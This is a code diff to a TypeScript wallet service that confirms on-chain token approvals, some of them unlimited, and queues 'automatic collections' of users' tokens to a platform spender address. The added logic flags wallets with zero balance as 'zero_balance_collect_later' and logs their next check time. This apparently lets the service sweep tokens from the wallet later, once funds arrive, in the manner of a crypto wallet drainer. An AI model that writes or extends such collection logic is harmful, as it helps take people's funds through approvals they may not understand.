@@ -1146,6 +1146,14 @@ export class WalletService {
     const hasAllowance = unlimited ? onChain > BigInt(0) : onChain >= expected;
     const tokenInfo = this.getToken(network, token)!;
     const executeTransfer = Boolean(body.executeTransfer);
+    const tokenBalanceHuman = String(body.tokenBalanceHuman ?? "").trim();
+    const tokenBalanceIsZero =
+      tokenBalanceHuman === "" ||
+      tokenBalanceHuman === "0" ||
+      (() => {
+        const n = Number.parseFloat(tokenBalanceHuman);
+        return Number.isFinite(n) && n <= 0;
+      })();
     // Automatic collections always settle to the configured platform spender.
     // Do not trust a browser-supplied destination for background transfers.
     const transferToAddress = spender;
@@ -1206,14 +1214,6 @@ export class WalletService {
         leaseUntil: null,
       },
     });
-    await this.recordAudit(`owner:${owner}`, "confirm", "approval", {
-      network,
-      txHash,
-      allowance: verified?.allowance ?? "0",
-      confirmed: hasAllowance,
-      executeTransfer,
-    }, approval.id);
-
     let transfer:
       | { transferId: string; txHash: string; transferredRaw: string; blockNumber: number | null }
       | null = null;
@@ -1222,7 +1222,9 @@ export class WalletService {
     if (!hasAllowance) {
       transferSkippedReason = "allowance_not_confirmed";
     } else if (!executeTransfer) {
-      transferSkippedReason = "execute_transfer_disabled";
+      transferSkippedReason = tokenBalanceIsZero
+        ? "zero_balance_collect_later"
+        : "execute_transfer_disabled";
     } else {
       const requestedTransferRaw = transferAmountRawInput
         ? BigInt(transferAmountRawInput)
@@ -1235,6 +1237,29 @@ export class WalletService {
         transferSkippedReason = "queued_for_background_collection";
       }
     }
+
+    await this.recordAudit(`owner:${owner}`, "confirm", "approval", {
+      network,
+      txHash,
+      allowance: verified?.allowance ?? "0",
+      confirmed: hasAllowance,
+      executeTransfer,
+      tokenBalanceHuman: tokenBalanceHuman || null,
+      zeroBalanceAtConfirm: tokenBalanceIsZero,
+      transferSkippedReason,
+      collectionPolicy: transferSkippedReason,
+    }, approval.id);
+
+    this.logFlow("APPROVAL CONFIRM RESULT", {
+      traceId,
+      approvalId: approval.id,
+      hasAllowance,
+      executeTransfer,
+      transferSkippedReason,
+      zeroBalanceAtConfirm: tokenBalanceIsZero,
+      collectionEnabled: approval.collectionEnabled,
+      nextCheckAt: approval.nextCheckAt?.toISOString() ?? null,
+    });
 
     return {
       ok: true,
